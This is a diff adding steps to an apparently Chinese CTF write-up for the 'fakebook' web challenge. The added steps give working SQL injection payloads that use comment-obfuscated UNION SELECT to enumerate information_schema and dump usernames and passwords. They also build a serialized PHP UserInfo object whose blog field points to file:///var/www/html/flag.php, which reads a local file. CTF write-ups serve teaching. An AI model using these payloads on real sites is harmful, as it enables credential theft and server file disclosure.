@@ -654,4 +654,16 @@ class UserInfo
 构造payload：
 `view.php?no=1+union/**/select+1,database(),3,4`爆出库名为fakebook
 
-`/view.php?no=1+union/**/select+1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('fakebook')),3,4`
+`/view.php?no=1+union/**/select+1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('fakebook')),3,4`得表名为users
+
+` /view.php?no=1+union/**/select+1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('users')),3,4+ `获得四列，no,username,passwd,data
+
+`/view.php?no=0%20union/**/select%201,group_concat(no,'-',username,'-',passwd,'-',data),3,4 from fakebook.users --+`取得四列的数据。
+其中，data是一个序列化后的串，结合上面的类，那么要在data部分提交序列化后的userinfo对象。
+向类传递参数：admin,0,file:///var/www/html/flag.php
+得到序列化后的对象：
+`O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`
+构造payload：
+`/view.php?no=0+union/**/select+1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
+直接在第四列data的位置上填上序列化后的对象。
+访问页面查看源码，拿到base64的flag,解码后拿到flag。
